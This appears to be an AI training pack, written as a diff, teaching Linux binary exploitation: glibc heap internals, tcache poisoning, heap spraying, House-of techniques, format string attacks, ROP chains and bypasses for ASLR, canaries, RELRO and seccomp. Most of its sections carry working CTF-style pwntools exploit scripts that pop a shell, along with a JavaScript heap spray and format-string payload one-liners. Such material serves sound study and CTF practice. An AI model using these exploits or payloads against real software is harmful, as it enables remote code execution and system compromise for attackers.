@@ -1,0 +1,431 @@
+================================================================================
+TITAN AI — TRAINING PACK 040: BINARY EXPLOITATION — HEAP, FORMAT STRINGS, ROP CHAINS
+GLIBC HEAP INTERNALS, TCACHE POISONING, HEAP FENG SHUI, ROP CHAIN CONSTRUCTION
+================================================================================
+
+================================================================================
+PART 1: GLIBC HEAP INTERNALS
+================================================================================
+
+--- MALLOC ARCHITECTURE ---
+
+glibc malloc (ptmalloc2): The heap allocator for virtually all Linux userspace.
+
+CHUNK STRUCTURE:
+  Every allocation is a "chunk" with metadata header.
+  
+  Allocated chunk layout:
+  +--------------------+
+  | prev_size (8 bytes)| ← Size of previous chunk (only used when prev chunk is free)
+  +--------------------+
+  | size      (8 bytes)| ← Size of this chunk + flags in low 3 bits
+  +--------------------+
+  | user data          | ← What malloc() returns a pointer to
+  | ...                |
+  +--------------------+
+  
+  Size flags (packed into low 3 bits of size field):
+  PREV_INUSE (P, bit 0): Previous chunk is in use (not free)
+  IS_MMAPED (M, bit 1): Chunk was obtained via mmap
+  NON_MAIN_ARENA (A, bit 2): Chunk belongs to non-main arena
+  
+  Free chunk layout:
+  +--------------------+
+  | prev_size (8 bytes)|
+  +--------------------+
+  | size      (8 bytes)|
+  +--------------------+
+  | fd        (8 bytes)| ← Forward pointer to next free chunk in bin
+  +--------------------+
+  | bk        (8 bytes)| ← Backward pointer to prev free chunk in bin
+  +--------------------+
+  | (unused data)      |
+  +--------------------+
+  | prev_size (8 bytes)| ← At end of chunk, copied from start of NEXT chunk
+  +--------------------+
+
+BINS — WHERE FREE CHUNKS GO:
+
+Tcache (Thread Cache, glibc 2.26+, 2017):
+  Per-thread singly-linked list. Fastest allocation path.
+  7 bins for sizes 24-1016 bytes (16-byte aligned on 64-bit).
+  Max 7 chunks per bin per thread.
+  NO INTEGRITY CHECKS in early implementations (glibc < 2.34).
+  
+Fast bins:
+  Singly-linked. Small chunks (≤128 bytes on 64-bit).
+  NO coalescing: Fast bin chunks not merged with neighbors.
+  LIFO: Last freed = first allocated.
+  
+Unsorted bin:
+  Doubly-linked (fd + bk). Free chunks dumped here first.
+  On malloc: Unsorted bin scanned. Exact fit taken directly.
+  Large/small bins: Chunks from unsorted bin sorted into here.
+  
+Small bins:
+  62 doubly-linked bins. Fixed sizes (16 to 504 bytes).
+  FIFO: First freed = first allocated.
+  
+Large bins:
+  63 doubly-linked bins. Variable size ranges.
+  Sorted within bin: Largest first.
+
+================================================================================
+PART 2: HEAP EXPLOITATION TECHNIQUES
+================================================================================
+
+--- TCACHE POISONING (GLIBC < 2.34) ---
+
+MECHANISM:
+  Tcache: Singly-linked via "next" pointer (where fd was in free chunk).
+  NO integrity check on "next" pointer.
+  Attacker: Overwrite "next" pointer of tcache chunk → points to target address.
+  malloc(): Returns tcache chunk (real), then tcache returns TARGET ADDRESS.
+  Write to "allocated" target → arbitrary write.
+
+STEP BY STEP:
+  Step 1: Allocate two chunks A and B of same size class (e.g., 0x20 bytes each)
+  Step 2: Free B → goes to tcache bin
+  Step 3: Free A → goes to tcache bin. Tcache: A → B → NULL
+  Step 4: Overflow/UAF: Overwrite A's "next" pointer with TARGET_ADDRESS
+         (e.g., __malloc_hook or a GOT entry)
+  Tcache now: A → TARGET_ADDRESS → ???
+  Step 5: malloc(0x20) → Returns A (legitimate chunk, remove from tcache)
+         Tcache now: TARGET_ADDRESS
+  Step 6: malloc(0x20) → Returns TARGET_ADDRESS (tcache doesn't check!)
+  Step 7: Write shellcode/function pointer to "chunk" at TARGET_ADDRESS
+
+EXPLOIT CODE (CTF-style, glibc 2.27):
+  from pwn import *
+  
+  p = process('./vuln')
+  
+  # Allocate chunks
+  alloc(0x20)  # chunk A (index 0)
+  alloc(0x20)  # chunk B (index 1)
+  
+  # Free both — tcache: A -> B -> NULL
+  free(1)  # free B first
+  free(0)  # free A → tcache: A → B
+  
+  # Target: __malloc_hook (write arbitrary function pointer here,
+  #          called on next malloc with null argument → execve /bin/sh)
+  target = elf.symbols['__malloc_hook']  # or libc.symbols['__malloc_hook']
+  
+  # UAF: Write into freed chunk A to corrupt next pointer
+  # (via overflow, UAF write, or heap metadata corruption)
+  write_to_chunk(0, p64(target))  # A's next = __malloc_hook
+  
+  # Two mallocs: First returns A, second returns __malloc_hook address
+  alloc(0x20)  # Gets A (real allocation)
+  alloc(0x20)  # Gets __malloc_hook !!! (fake allocation)
+  
+  # Write one_gadget address (RCE gadget that calls execve /bin/sh)
+  one_gadget = libc_base + 0x4f3c2  # Found with one_gadget tool
+  write_to_chunk(2, p64(one_gadget))  # Writes to __malloc_hook
+  
+  # Trigger malloc → __malloc_hook called → one_gadget → shell
+  alloc(0x20)  # ← This calls __malloc_hook → RCE
+
+TCACHE MITIGATIONS (glibc 2.34+):
+  Safe-linking: "next" pointer XOR'd with position >> 12.
+  Encrypted: fd_next = next XOR (address_of_chunk >> 12)
+  Attacker: Must know chunk address to predict XOR key. Defeats simple tcache poison.
+  
+  Bypass: Heap leak to recover chunk address → predict XOR key → forge encrypted pointer.
+
+--- HEAP FENG SHUI (HEAP GROOMING) ---
+
+DEFINITION: Manipulate heap state to place allocations at predictable locations
+to enable exploitation of a subsequent vulnerability.
+
+EXAMPLE SCENARIO:
+  Vulnerability: Use-after-free in object X (freed but pointer retained).
+  Object Y: Same size as X. Contains function pointer at same offset as interesting field.
+  
+  Goal: Reallocate freed X memory with controlled object Y → call function pointer.
+  
+  Problem: Heap is unpredictable. Y might not land in X's old spot.
+  Solution: Heap grooming.
+  
+  Step 1: "Spray" — allocate many objects to fill unsorted/tcache bins.
+  Step 2: "Drain" — free specific pattern to create hole at desired position.
+  Step 3: Trigger vulnerability (UAF frees X).
+  Step 4: Allocate Y (same size) → lands in X's spot because you controlled heap state.
+  Step 5: Access via old X pointer → actually reads Y's data → controlled function pointer.
+
+BROWSER HEAP SPRAY (JavaScript):
+  Spray ArrayBuffers of size 0x100 (predictable tcache/unsorted bin behavior):
+  
+  var spray = [];
+  for (var i = 0; i < 1000; i++) {
+      spray.push(new ArrayBuffer(0x100));
+      spray[i] = new Uint32Array(spray[i]);
+      // Fill with shellcode / ROP chain address patterns
+      for (var j = 0; j < 64; j++) {
+          spray[i][j] = 0x0c0c0c0c;  // NOP sled address
+      }
+  }
+  // After UAF: Very likely a freed object is now backed by one of our spray chunks.
+  // Object's vtable/function pointer = 0x0c0c0c0c → mapped NOP sled → shellcode.
+
+--- HOUSE OF TECHNIQUES ---
+
+"House of" techniques: Classic heap exploitation named patterns.
+
+HOUSE OF SPIRIT:
+  Forge a fake chunk, free it → it goes into a bin.
+  Next allocation of that size: Returns your fake chunk → write to arbitrary location.
+  
+  Requirement: Control a memory region you can write "chunk metadata" to.
+  Create fake prev_size + size fields → free the "fake" chunk pointer.
+  Malloc checks: Only prev_size of NEXT chunk, alignment, size constraints.
+  
+  Use case: Free fake chunk on stack → next malloc returns stack address.
+  Stack as "heap": Write data to stack at controlled offset.
+
+HOUSE OF EINHERJAR:
+  Single NULL byte overflow into next chunk's size field.
+  Clears PREV_INUSE flag → allocator thinks previous chunk is free.
+  Triggers "coalescing" with controlled fake "previous" chunk.
+  Result: Large free chunk at attacker-controlled location.
+
+HOUSE OF ORANGE (no free primitive):
+  When you have write primitive but no free() — need to get chunks freed somehow.
+  Overflow top chunk size → make it appear small.
+  Large malloc request → top chunk "exhausted" → _int_malloc tries brk.
+  Old top chunk → freed to unsorted bin.
+  Now have a free chunk to work with.
+
+================================================================================
+PART 3: FORMAT STRING EXPLOITATION
+================================================================================
+
+--- FORMAT STRING FUNDAMENTALS ---
+
+VULNERABLE CODE:
+  // Vulnerable:
+  printf(user_input);           // user_input is format string
+  sprintf(buf, user_input);
+  
+  // Safe:
+  printf("%s", user_input);     // user_input is argument, not format string
+  
+FORMAT STRING SPECIFIERS FOR EXPLOITATION:
+  %p: Print pointer (read stack values). Use for leaking addresses (ASLR defeat).
+  %x: Print hex value (like %p but 32-bit).
+  %s: Dereference pointer on stack as string. Read arbitrary memory.
+  %n: WRITE number of characters printed so far to int* on stack.
+  %hn: Write to short (2 bytes).
+  %hhn: Write to byte (1 byte). Enables byte-by-byte writes.
+  %N$: Access Nth argument directly. "Direct parameter access."
+
+READING ARBITRARY MEMORY:
+  Input: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p
+  Output: 0x7fff123.0x0.0x401234.0x7ffe123...
+  
+  These are values FROM THE STACK. Each %p pops one "argument" from stack.
+  Find: Which %p corresponds to your input buffer itself?
+  
+  # Binary search for offset:
+  python3 -c "print('AAAA.%p.'*15)" | ./vuln
+  # Find output containing 0x41414141 → That's your string on the stack.
+  # Offset = position of that %p (e.g., offset 6)
+  
+  # Read arbitrary address using direct parameter access:
+  # Stack at offset 6 = our input → place target address there, read with %s
+  python3 -c "import struct; print(struct.pack('<Q', 0x602020) + b'.%6$s')" | ./vuln
+  # %6$s: Read value at 6th argument on stack AS A POINTER → dereference.
+  # Returns: Content of memory at 0x602020 (e.g., GOT entry = libc address)
+
+WRITING ARBITRARY VALUES WITH %n:
+  # Write 0x41424344 to address 0x602020
+  # Strategy: Split into bytes. Write each byte separately with %hhn.
+  
+  # Target bytes:  0x44 (68), 0x43 (67), 0x42 (66), 0x41 (65) at different addresses.
+  
+  # Format string layout:
+  # [addr+0][addr+1][addr+2][addr+3] %Xc%N$hhn %Yc%M$hhn ...
+  # X = 68 (first byte value), N = parameter offset for addr+0
+  
+  # Automated with pwntools fmtstr_payload:
+  from pwn import *
+  
+  context.arch = 'amd64'
+  
+  p = process('./vuln')
+  
+  target_addr = 0x602020  # GOT entry for printf
+  new_value = 0x401234    # Redirect to win() function
+  
+  # fmtstr_payload(offset, {address: value}):
+  payload = fmtstr_payload(6, {target_addr: new_value})
+  
+  p.sendline(payload)
+  p.interactive()
+  # printf()'s GOT entry now points to win(). Next printf() call = win()
+
+================================================================================
+PART 4: RETURN ORIENTED PROGRAMMING (ROP)
+================================================================================
+
+--- ROP FUNDAMENTALS ---
+
+WHY ROP:
+  NX/DEP (No-Execute / Data Execution Prevention): Stack/heap marked non-executable.
+  Cannot: Jump to shellcode on stack/heap and execute.
+  Can: Return to existing executable code (the binary, libc, etc.).
+  ROP: Chain existing code "gadgets" to perform arbitrary computation.
+
+GADGET: Small code sequences ending in `ret` instruction.
+  ret: Pop return address from stack, jump to it.
+  Gadget examples:
+  pop rdi; ret    ← Set RDI to value on stack. Essential for function call setup.
+  pop rsi; ret    ← Set RSI.
+  pop rdx; ret    ← Set RDX.
+  mov rax, [rdi]; ret  ← Read memory.
+  syscall; ret    ← Make system call.
+
+SYSTEM CALL CONVENTION (Linux x86-64):
+  rax = syscall number
+  rdi = 1st argument
+  rsi = 2nd argument
+  rdx = 3rd argument
+  r10 = 4th argument
+  r8  = 5th argument
+  r9  = 6th argument
+
+EXECVE /BIN/SH ROP CHAIN:
+  Goal: Call execve("/bin/sh", NULL, NULL)
+  execve syscall number = 59 (0x3b)
+  rax = 0x3b
+  rdi = address of "/bin/sh" string
+  rsi = 0 (NULL)
+  rdx = 0 (NULL)
+  
+  Chain:
+  [pop rdi; ret]       ← gadget address
+  ["/bin/sh" address]  ← value for rdi (address of "/bin/sh" in libc or binary)
+  [pop rsi; ret]       ← gadget address
+  [0]                  ← value for rsi = NULL
+  [pop rdx; ret]       ← gadget address
+  [0]                  ← value for rdx = NULL
+  [pop rax; ret]       ← gadget address
+  [0x3b]               ← value for rax = execve syscall number
+  [syscall]            ← gadget address — executes the syscall
+
+BUILDING A ROP CHAIN WITH PWNTOOLS + ROPPER:
+  # Find gadgets:
+  ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search "pop rdi"
+  # Output: 0x0002a3e5: pop rdi; ret;  (offset from libc base)
+  
+  # Python exploit:
+  from pwn import *
+  
+  elf = ELF('./vuln')
+  libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+  
+  p = process('./vuln')
+  
+  # First: Leak libc base via puts/printf call (ret2plt technique)
+  # Overflow → call puts(GOT entry of puts) → Reveals libc address of puts
+  
+  rop = ROP(elf)
+  rop.puts(elf.got['puts'])   # Call puts(puts@GOT) → leak libc puts address
+  rop.main()                   # Return to main for second stage
+  
+  payload = b'A' * 40 + rop.chain()  # 40 bytes to reach return address
+  p.sendline(payload)
+  
+  # Parse leaked address
+  puts_leak = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\x00'))
+  libc_base = puts_leak - libc.symbols['puts']
+  print(f"libc base: {hex(libc_base)}")
+  
+  # Second stage: ROP chain using libc gadgets
+  binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
+  system = libc_base + libc.symbols['system']
+  
+  # system("/bin/sh") — simpler than full execve chain
+  rop2 = ROP(libc)
+  rop2.raw(libc_base + 0x2a3e5)  # pop rdi; ret
+  rop2.raw(binsh)                 # rdi = "/bin/sh"
+  rop2.raw(system)                # call system
+  
+  payload2 = b'A' * 40 + rop2.chain()
+  p.sendline(payload2)
+  p.interactive()  # Shell!
+
+RET2LIBC WITHOUT GADGET SEARCH:
+  In many cases: Simply return to system() with controlled RDI is sufficient.
+  libc always contains: system(), "/bin/sh" string.
+  No need for syscall chain. Just: RDI = "/bin/sh", return to system().
+
+--- ASLR BYPASS TECHNIQUES ---
+
+1. Libc Leak via format string or UAF:
+  Print a libc pointer → Calculate base → All libc gadgets known.
+
+2. PIE base leak:
+  Same technique for position-independent executables.
+  Print a code pointer → Calculate binary base → Use binary gadgets.
+
+3. Partial overwrite (no ASLR defeat needed):
+  Overwrite only low bytes of return address (no address leak needed).
+  ASLR randomizes upper bytes but NOT the low 12 bits (page aligned).
+  Overwrite 1-2 bytes → high probability of jumping to useful location.
+  Works best: 1-byte overwrite (256 attempts at most) or predictable pattern.
+
+4. Brute force (32-bit only):
+  32-bit ASLR: Only ~16 bits of randomness (256 possible base addresses in some configs).
+  Fork server: Child inherits parent's ASLR → same address every time.
+  Brute force: Try all 256 possible offsets until code hits mapped address.
+
+================================================================================
+PART 5: MITIGATION BYPASS SUMMARY
+================================================================================
+
+STACK CANARY:
+  Random value placed between local vars and return address.
+  On return: Canary checked. If modified → segfault (not exploitation).
+  
+  Bypass:
+  Leak canary via format string (%p at correct offset).
+  Or: find canary in memory via heap spray (stored elsewhere).
+  Or: Overwrite only what's AFTER canary (partial overwrite, adjacent struct field).
+  
+  x64 canary: Always ends in null byte (0x...00). Prevents certain string leaks.
+
+ASLR: See above (leak, partial overwrite, brute force).
+
+PIE (Position Independent Executable):
+  Binary itself randomized. Bypass via leak of any code pointer.
+
+RELRO (Relocation Read-Only):
+  Partial RELRO: GOT writable. GOT overwrites effective.
+  Full RELRO: GOT read-only. Must find other write targets (__malloc_hook, __free_hook, etc.)
+  __free_hook (glibc < 2.34): Called on free(). Write system() there, free("/bin/sh") → shell.
+  __malloc_hook: Called on malloc(). Same technique.
+  Removed in glibc 2.34: Must use other techniques (libc-exit-func, _IO_FILE exploitation).
+
+SECCOMP (Secure Computing Mode):
+  Restrict syscalls available to process.
+  Common restriction: No execve. No fork. Prevent shell execution.
+  
+  Bypass:
+  If read/write allowed: Read flag file directly. No shell needed.
+  Use open + read + write to read flag.
+  Or: openat (different syscall number). If blacklist not complete.
+  Or: Seccomp-bpf filter analysis: Find allowed syscall that can pivot.
+
+================================================================================
+END OF PACK 040: BINARY EXPLOITATION
+Total: glibc heap internals (chunk layout, bins/tcache/fastbins), tcache poisoning
+(step-by-step with pwntools exploit, safe-linking bypass), heap feng shui/spraying,
+House of Spirit/Einherjar/Orange techniques, format string exploitation (stack reading,
+arbitrary memory read with %s, arbitrary write with %hhn/fmtstr_payload), ROP chains
+(gadget concept, execve /bin/sh chain construction, ret2libc with pwntools ROP
+builder, libc leak → base calculation), ASLR bypass (leak/partial overwrite/brute
+force), stack canary bypass, mitigation summary (__free_hook/__malloc_hook removed in
+2.34, seccomp bypass).
+================================================================================
